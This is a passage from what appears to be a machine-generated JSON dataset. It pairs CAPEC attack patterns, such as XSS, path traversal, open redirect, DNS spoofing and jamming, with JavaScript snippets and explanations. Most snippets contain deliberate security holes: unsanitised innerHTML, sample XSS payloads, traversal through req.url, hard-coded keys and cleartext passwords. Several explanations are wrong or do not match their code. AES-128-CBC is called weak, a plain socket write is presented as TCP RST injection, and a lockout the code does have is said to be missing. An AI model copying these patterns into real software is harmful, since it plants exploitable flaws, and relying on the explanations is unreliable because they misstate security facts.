        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const blockedIP = '192.168.1.100';\n\n  if (clientIP === blockedIP) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that listens on all network interfaces (0.0.0.0) and blocks access from a specific IP address (192.168.1.100). If a request comes from the blocked IP, the server responds with a 403 status code and 'Access denied' message. Otherwise, it responds with 'Hello, world!'. This code demonstrates the concept of IP Address Blocking (CAPEC) by dropping packets from a specific IP address. It also highlights vulnerabilities such as Binding to an Unrestricted IP Address (CWE-1327) and Reliance on IP Address for Authentication (CWE-291), as the server listens on all interfaces and uses the IP address for access control."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Reflected XSS Example</title>\n</head>\n<body>\n    <h1>Search Results</h1>\n    <div id=\"results\"></div>\n    <script>\n        // Simulate user input from URL parameter\n        var params = new URLSearchParams(window.location.search);\n        var query = params.get('query');\n\n        // Vulnerable code: directly inserting user input into the DOM without proper sanitization\n        document.getElementById('results').innerHTML = 'You searched for: ' + query;\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Reflected XSS vulnerability. The script extracts a 'query' parameter from the URL and directly inserts it into the DOM without proper sanitization. This allows an attacker to craft a URL with malicious JavaScript code in the 'query' parameter, which will be executed in the victim's browser when they visit the URL. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by failing to neutralize user input before rendering it in the web page."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Stored XSS Example</title>\n</head>\n<body>\n    <h1>Comment Section</h1>\n    <form method=\"POST\" action=\"/submit_comment\">\n        <textarea name=\"comment\"></textarea>\n        <button type=\"submit\">Submit</button>\n    </form>\n    <div id=\"comments\">\n        <!-- Comments will be inserted here -->\n        <script>\n            // Simulate fetching comments from a server\n            var comments = [\n                \"<img src='x' onerror='alert(\\\"XSS\\\")'>\",\n                \"<script>alert('Stored XSS');</script>\"\n            ];\n            comments.forEach(function(comment) {\n                document.getElementById('comments').innerHTML += '<p>' + comment + '</p>';\n            });\n        </script>\n    </div>\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a stored XSS vulnerability. The form allows users to submit comments, which are then stored and displayed on the page without proper sanitization. The comments array simulates stored comments that include malicious scripts. When the page loads, these scripts are executed, demonstrating the stored XSS attack. This example highlights the importance of properly neutralizing user input to prevent XSS attacks, as described in the related CWEs."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 60000 }\n}));\n\napp.post('/login', (req, res) => {\n  // Simulate user authentication\n  if (req.body.username === 'user' && req.body.password === 'pass') {\n    req.session.user = req.body.username;\n    res.send('Logged in');\n  } else {\n    res.send('Authentication failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) {\n    res.send('Welcome to your dashboard, ' + req.session.user);\n  } else {\n    res.send('Please log in first');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The code demonstrates several vulnerabilities related to session hijacking:\n\n1. **Improper Authentication (CWE-287)**: The authentication mechanism is overly simplistic and does not properly verify user credentials.\n2. **Session Fixation (CWE-384)**: The session ID is not invalidated upon user login, allowing an attacker to fixate a session ID and hijack the session.\n3. **Insufficient Session Expiration (CWE-613)**: The session expiration is set to a short duration (60 seconds), but it does not handle session invalidation properly, allowing potential reuse of old session IDs.\n4. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The server relies on the client to manage session state without proper server-side validation.\n\nThe code represents the main idea of CAPEC-288 (Session Hijacking) by illustrating how an adversary could exploit these weaknesses to hijack a user's session and gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    \n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString().includes('INJECT')) {\n      console.log('Injected traffic detected!');\n      socket.write('Error: Invalid data');\n      return;\n    }\n    \n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (!socket.remoteAddress.startsWith('192.168.')) {\n      console.log('Unverified source!');\n      socket.write('Error: Unverified source');\n      return;\n    }\n    \n    // Process valid data\n    socket.write('Data received');\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities: \n1. CWE-319: The data is logged in cleartext, which can be sniffed by unauthorized actors. \n2. CWE-924: The code checks for a specific string 'INJECT' to detect injected traffic but does not ensure message integrity during transmission. \n3. CWE-940: The code verifies the source of the communication channel by checking the remote address, but this check is simplistic and can be bypassed. \nThe main idea of the CAPEC is represented by the potential for an adversary to inject traffic into the network connection, degrade or disrupt the connection, and possibly modify the content."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst targetHost = 'target.server.com';\nconst targetPort = 80;\n\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target server');\n  // Simulate sending a reset packet\n  client.write('FAKE_RESET_PACKET');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a connection reset attack using Node.js's 'net' module. The code connects to a target server and sends a fake reset packet to disrupt the connection. The 'FAKE_RESET_PACKET' is a placeholder for an actual reset packet that an attacker might send. The code then immediately destroys the client socket, simulating the severing of the connection. This embodies the CAPEC's main idea of injecting a connection reset packet to disrupt communication. The related CWEs are represented by the lack of proper verification of the source (CWE-940), insufficient message integrity checks (CWE-924), and potential for multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const net = require('net');\n\nconst targetHost = 'example.com';\nconst targetPort = 80;\nconst fakeRSTPacket = Buffer.from('45000028a6f400004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target');\n  client.write(fakeRSTPacket);\n  console.log('Sent fake RST packet');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RST Injection attack. It uses the 'net' module to create a TCP connection to a target server (example.com on port 80). Once connected, it sends a fake TCP RST packet to the server, which can cause the server to terminate the TCP connection. This attack exploits the lack of proper verification of the source of a communication channel (CWE-940) and can disrupt the communication between a client and server. The code also includes error handling for connection issues."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The main vulnerability here is the use of 'req.url' directly to construct the file path with 'path.join(__dirname, req.url)'. This allows an attacker to perform an absolute path traversal attack by manipulating the URL to include sequences like '/../', potentially accessing sensitive files outside the intended directory. This code embodies the main idea of the CAPEC by demonstrating how improper handling of user input in file path construction can lead to security vulnerabilities such as absolute path traversal."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst targetDomain = 'example.com';\nconst maliciousIP = '192.0.2.1';\n\n// Simulate DNS Spoofing by overriding DNS resolution\nconst originalLookup = dns.lookup;\ndns.lookup = (hostname, options, callback) => {\n  if (hostname === targetDomain) {\n    return callback(null, maliciousIP, 4);\n  }\n  return originalLookup(hostname, options, callback);\n};\n\n// Example of a security-critical action based on reverse DNS resolution\nhttp.get(`http://${targetDomain}`, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log('Response:', data); });\n}).on('error', (err) => { console.error('Error:', err.message); });",
        "description": "This JavaScript code snippet demonstrates a DNS Spoofing attack by overriding the DNS resolution for a specific target domain ('example.com') to return a malicious IP address ('192.0.2.1'). The code uses Node.js's 'dns' and 'http' modules. The 'dns.lookup' function is overridden to simulate the DNS Spoofing, redirecting any requests to 'example.com' to the malicious IP. The 'http.get' function then makes an HTTP request to the target domain, which is redirected to the malicious IP due to the spoofed DNS resolution. This example highlights the vulnerability of relying on DNS for security-critical actions (CWE-350) and the potential for incorrect destination specification in communication channels (CWE-941)."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction sendData(data) {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/api', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({ data: data }));\n}\n\nfunction receiveData() {\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'http://example.com/api', true);\n  xhr.onload = function() {\n    if (xhr.status === 200) {\n      console.log('Received data:', xhr.responseText);\n    }\n  };\n  xhr.send();\n}\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nsendData(sensitiveData);\nreceiveData();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is transmitted and received over an insecure communication channel, embodying the main idea of the CAPEC 'Terrestrial Jamming'. The code includes vulnerabilities related to the CWEs mentioned: CWE-319 (Cleartext Transmission of Sensitive Information) by sending sensitive data in plaintext, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by not verifying the integrity of the received data, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not ensuring the communication is with the correct endpoint. This makes the communication susceptible to interception and tampering, similar to how terrestrial jamming disrupts satellite communication."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password1', 'user2': 'password2' }; // CWE-522: Insufficiently Protected Credentials\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (!loginAttempts[username]) loginAttempts[username] = 0;\n  if (loginAttempts[username] >= 5) { // CWE-307: No lockout mechanism\n    return res.status(429).send('Too many attempts, try again later.');\n  }\n  if (users[username] && users[username] === password) { // CWE-308: Single-factor Authentication\n    loginAttempts[username] = 0;\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username]++;\n    return res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It embodies the main idea of CAPEC- Credential Stuffing by demonstrating how an adversary could exploit weak authentication mechanisms. The code includes several related CWEs: CWE-522 (Insufficiently Protected Credentials) by storing passwords in plain text, CWE-307 (Improper Restriction of Excessive Authentication Attempts) by not implementing a proper lockout mechanism after multiple failed attempts, and CWE-308 (Use of Single-factor Authentication) by relying solely on username and password for authentication. The code highlights the vulnerabilities that could be exploited in a credential stuffing attack."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    \n    // CWE-924: No integrity check\n    if (data.toString().includes('important')) {\n      // CWE-923: No endpoint verification\n      socket.write('Sensitive data received');\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-406: No control over message volume\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  for (let i = 0; i < 1000; i++) {\n    client.write('important message ' + i);\n  }\n});\n\n// CWE-421: Race condition on alternate channel\nconst altClient = new net.Socket();\naltClient.connect(8080, '127.0.0.1', () => {\n  altClient.write('alternate channel message');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP server and client setup using the 'net' module. The server listens on port 8080 and processes incoming data. The code embodies the main idea of the CAPEC 'Jamming' by illustrating several related CWEs:\n\n1. **CWE-319 (Cleartext Transmission of Sensitive Information)**: The server logs received data in cleartext, which can be intercepted by unauthorized actors.\n2. **CWE-924 (Improper Enforcement of Message Integrity During Transmission)**: The server does not verify the integrity of the received messages.\n3. **CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)**: The server does not verify the endpoint before responding with sensitive data.\n4. **CWE-406 (Insufficient Control of Network Message Volume)**: The client sends a large volume of messages to the server, potentially overwhelming it.\n5. **CWE-421 (Race Condition During Access to Alternate Channel)**: An alternate client sends a message on the same port, potentially causing a race condition.\n\nThe code represents the concept of jamming by showing how an adversary can disrupt communications through overwhelming traffic and exploiting weaknesses in message integrity, endpoint verification, and transmission control."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "const crypto = require('crypto');\n\n// Using an obsolete function for cryptographic operations\nfunction insecureHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulating a security decision based on DNS lookup\nconst dns = require('dns');\nfunction isTrustedDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (err) throw err;\n    if (address === '192.168.1.1') { // Insecure reliance on DNS lookup\n      console.log('Trusted domain');\n    } else {\n      console.log('Untrusted domain');\n    }\n  });\n}\n\n// Example usage\nconsole.log(insecureHash('sensitiveData'));\nisTrustedDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates the use of deprecated and insecure practices, aligning with the CAPEC and related CWEs. The `insecureHash` function uses the obsolete MD5 hashing algorithm (CWE-477), which is known to be vulnerable to collision attacks. The `isTrustedDomain` function makes a security decision based on a DNS lookup (CWE-247), which can be unreliable and manipulated. These practices highlight the risks associated with using outdated functions and making security decisions based on potentially insecure data sources."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet resourceCount = 0;\nconst MAX_RESOURCES = 100;\n\napp.get('/allocate', (req, res) => {\n  if (resourceCount >= MAX_RESOURCES) {\n    return res.status(503).send('Service Unavailable: Resource limit reached');\n  }\n  resourceCount++;\n  res.send('Resource allocated');\n});\n\napp.get('/block', (req, res) => {\n  while (true) {\n    // Infinite loop to simulate resource blockage\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates the concept of resource blockage and related weaknesses. The '/allocate' endpoint allocates a resource and enforces a limit on the number of resources that can be allocated, addressing CWE-770 (Allocation of Resources Without Limits or Throttling). The '/block' endpoint simulates a blockage by entering an infinite loop, which can lead to resource exhaustion (CWE-400: Uncontrolled Resource Consumption) and potentially cause the server to fail or stop working, embodying the main idea of the CAPEC 'Blockage'."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "const wifiChannel = 'channel_6';\nconst deauthFrame = new Uint8Array([0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);\n\nfunction jamWiFi() {\n  setInterval(() => {\n    sendDeauthFrame(wifiChannel, deauthFrame);\n  }, 100);\n}\n\nfunction sendDeauthFrame(channel, frame) {\n  // Simulate sending a deauthentication frame on the specified channel\n  console.log(`Sending deauth frame on ${channel}:`, frame);\n}\n\njamWiFi();",
        "description": "This JavaScript code snippet simulates a Wi-Fi jamming attack by repeatedly sending deauthentication frames on a specified Wi-Fi channel. The `jamWiFi` function uses `setInterval` to continuously call `sendDeauthFrame`, which logs the action of sending a deauthentication frame. This represents the CAPEC scenario of Wi-Fi jamming by flooding the access point with deauthentication frames. The code also touches on related CWEs: it does not verify the source of the communication (CWE-940), does not ensure message integrity (CWE-924), and does not restrict the communication channel to intended endpoints (CWE-923)."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '192.168.1.1', () => {\n  console.log('Connected to cell tower');\n  // CWE-319: Transmitting sensitive information in cleartext\n  client.write('AUTH: user:password');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-924: Not verifying message integrity\n  if (data.includes('STATUS')) {\n    console.log('Status message received');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-300: Channel accessible by non-endpoint\nconst attacker = new net.Socket();\nattacker.connect(12345, '192.168.1.1', () => {\n  console.log('Attacker connected to cell tower');\n  // Overwhelm with false status messages\n  setInterval(() => {\n    attacker.write('STATUS: false');\n  }, 100);\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a cellular jamming attack. The client connects to a cell tower and transmits sensitive information in cleartext (CWE-319). It also does not verify the integrity of received messages (CWE-924). An attacker connects to the same cell tower and overwhelms it with false status messages (CWE-300), disrupting the communication channel. This embodies the main idea of the CAPEC by showing how an attacker can disrupt cellular communication through improper handling of communication channels and message integrity."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, algorithm) {\n  const key = 'hardcodedkey123'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return iv.toString('hex') + ':' + encrypted;\n}\n\nfunction negotiateAlgorithm(preferredAlgorithms) {\n  const supportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc', 'des']; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  for (let alg of preferredAlgorithms) {\n    if (supportedAlgorithms.includes(alg)) {\n      return alg;\n    }\n  }\n  return 'des'; // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n}\n\nconst data = 'Sensitive Information';\nconst preferredAlgorithms = ['aes-256-cbc', 'aes-128-cbc', 'des'];\nconst algorithm = negotiateAlgorithm(preferredAlgorithms);\nconst encryptedData = encryptData(data, algorithm);\nconsole.log(`Encrypted Data: ${encryptedData}`);",
        "description": "This JavaScript code snippet demonstrates a scenario where a less secure encryption algorithm is selected during negotiation, embodying the main idea of CAPEC-Weakening of Cellular Encryption. The `encryptData` function uses a hard-coded cryptographic key (CWE-321) and supports multiple encryption algorithms, including a broken or risky one (CWE-327). The `negotiateAlgorithm` function simulates the selection of an encryption algorithm, potentially downgrading to a less secure one (CWE-757). The code highlights the risk of using inadequate encryption strength and the potential for an attacker to force the use of a weaker algorithm."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfig() {\n  try {\n    let data = fs.readFileSync('/etc/config.json', 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading config:', err);\n    return null;\n  }\n}\n\nfunction performCriticalOperation() {\n  let config = readConfig();\n  if (!config) {\n    console.error('Critical operation aborted: Configuration not available.');\n    return;\n  }\n  // Simulate a critical operation\n  console.log('Performing critical operation with config:', config);\n}\n\n// Simulate obstruction by deleting the config file\nfs.unlinkSync('/etc/config.json');\n\n// Attempt to perform a critical operation\nperformCriticalOperation();",
        "description": "This JavaScript code snippet demonstrates an obstruction attack by deleting a critical configuration file before attempting to perform a critical operation. The `readConfig` function tries to read a configuration file, and if it fails, it logs an error and returns null. The `performCriticalOperation` function depends on the configuration file; if the file is not available, it aborts the operation. The code simulates an obstruction by deleting the configuration file using `fs.unlinkSync` before calling `performCriticalOperation`. This represents the CAPEC idea of obstructing interactions between system components, causing the system to degrade or stop working as intended. The related CWEs are illustrated by the lack of proper error handling and protection mechanisms, leading to a failure in performing critical operations."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Use of a broken or risky cryptographic algorithm (CWE-327)\nconst algorithm = 'aes-128-cbc'; // Weak encryption algorithm\nconst key = '1234567890123456'; // Hard-coded cryptographic key (CWE-321)\nconst iv = crypto.randomBytes(16);\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encryptedText) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\n// Example usage\nconst message = 'Sensitive data';\nconst encryptedMessage = encrypt(message);\nconsole.log('Encrypted:', encryptedMessage);\nconst decryptedMessage = decrypt(encryptedMessage);\nconsole.log('Decrypted:', decryptedMessage);",
        "description": "This JavaScript code snippet demonstrates the use of a broken or risky cryptographic algorithm (CWE-327) and a hard-coded cryptographic key (CWE-321) to encrypt and decrypt sensitive data. The algorithm used is 'aes-128-cbc', which is considered weak by modern standards. The key is hard-coded, making it easier for attackers to recover the encrypted data. This example embodies the main idea of the CAPEC by showing how weak encryption and poor key management can lead to vulnerabilities in cellular encryption, making it susceptible to cryptanalysis attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'user_password=12345';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server checks for a custom header to verify the source of the communication channel (CWE-940). If the header is not as expected, it responds with a 'Forbidden' status. However, if the header is correct, it transmits sensitive information (a user password) in cleartext (CWE-319). This represents the main idea of the CAPEC 'Cellular Traffic Intercept', where sensitive data can be intercepted due to improper verification and cleartext transmission."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user_password=12345'; // CWE-201\n\nhttp.createServer((req, res) => {\n  if (req.url === '/debug') {\n    // CWE-1313: Activating debug logic at runtime\n    console.log('Debug mode activated');\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Debug mode activated');\n  } else {\n    // CWE-319: Transmitting sensitive data in cleartext\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sensitiveData);\n  }\n}).listen(8080, '127.0.0.1');\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server has two main functionalities: \n1. If the URL '/debug' is accessed, it activates a debug mode at runtime (CWE-1313), which could potentially alter the system's behavior and expose sensitive information.\n2. For any other URL, it transmits sensitive data (user password) in cleartext (CWE-319), making it vulnerable to interception by unauthorized actors. \nThis code embodies the main idea of the CAPEC 'Cellular Data Injection' by demonstrating how an adversary could inject data into the communication flow to disrupt or surveil the system. The use of cleartext transmission and runtime activation of debug logic highlights the potential weaknesses that could be exploited."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    // CWE-601: Open Redirect\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h1>Welcome to the trusted site</h1>');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. It parses the URL query string to check for a 'redirect' parameter. If the 'redirect' parameter is present, the server responds with a 302 redirect to the specified URL, demonstrating CWE-601 (Open Redirect). This vulnerability can be exploited in a BitSquatting attack where an adversary registers a domain name one bit different from a trusted domain. Users who accidentally visit the malicious domain could be redirected to an attacker-controlled site, facilitating phishing attacks or other malicious activities. The code highlights the risk of handling user-controlled input for redirection without proper validation."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "const wifi = require('node-wifi');\nconst fs = require('fs');\n\nwifi.init({ iface: null });\n\nfunction logMacAddresses() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    const macAddresses = networks.map(network => network.mac);\n    fs.writeFile('mac_addresses.txt', macAddresses.join('\\n'), (err) => {\n      if (err) {\n        console.error('Error writing MAC addresses to file:', err);\n      } else {\n        console.log('MAC addresses logged successfully.');\n      }\n    });\n  });\n}\n\nlogMacAddresses();",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for nearby WiFi networks and logs their MAC addresses to a file named 'mac_addresses.txt'. The code initializes the WiFi module, scans for networks, extracts the MAC addresses, and writes them to a file. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by demonstrating how an attacker could passively collect MAC addresses. The code also touches on related CWEs: it transmits sensitive information (MAC addresses) to a file (CWE-201), and the file could be accessed by unauthorized actors if not properly secured (CWE-529)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "const wifi = require('node-wifi');\n\nwifi.init({ iface: null });\n\nwifi.scan((error, networks) => {\n  if (error) {\n    console.error(error);\n  } else {\n    networks.forEach(network => {\n      if (network.ssid) {\n        console.log(`SSID: ${network.ssid}`);\n      }\n    });\n  }\n});",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for available WiFi networks and log their SSIDs. The code initializes the WiFi module, scans for networks, and then iterates through the list of networks to print out each SSID. This embodies the main idea of the CAPEC 'WiFi SSID Tracking' by demonstrating how an attacker could passively listen for WiFi management frames to capture SSIDs. The related CWEs are represented in the context of transmitting sensitive information (SSID) without adequate verification or protection, making it accessible to unauthorized actors."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a broken DES key\nconst desKey = '12345678'; // Weak DES key\nconst message = 'OTA update message';\n\n// Encrypt the message using DES (broken cryptographic algorithm)\nconst cipher = crypto.createCipheriv('des-ecb', desKey, null);\nlet encryptedMessage = cipher.update(message, 'utf8', 'hex');\nencryptedMessage += cipher.final('hex');\n\n// Simulate sending the encrypted message as an OTA update\nfunction sendOTAUpdate(encryptedMessage) {\n  console.log('Sending OTA update:', encryptedMessage);\n  // In a real scenario, this would be sent to the SIM card\n}\n\nsendOTAUpdate(encryptedMessage);\n\n// Simulate the SIM card executing the received message\nfunction executeOnSIM(encryptedMessage) {\n  const decipher = crypto.createDecipheriv('des-ecb', desKey, null);\n  let decryptedMessage = decipher.update(encryptedMessage, 'hex', 'utf8');\n  decryptedMessage += decipher.final('utf8');\n  console.log('Executing on SIM:', decryptedMessage);\n  // Execute the decrypted message as a Java applet\n}\n\nexecuteOnSIM(encryptedMessage);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. It uses a weak DES key (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to encrypt an OTA update message. The encrypted message is then sent to the SIM card, which decrypts and executes it. This represents the potential for abuse by sending properly signed binary SMS messages that are treated as executable Java applets on the SIM card. The code highlights the vulnerability of using inadequate encryption strength (CWE-326) and the risks associated with firmware that cannot be updated to address such weaknesses (CWE-1277)."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'username=admin&password=secret';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n}).listen(8080, '0.0.0.0');\n\nconsole.log('Server running at http://0.0.0.0:8080/');",
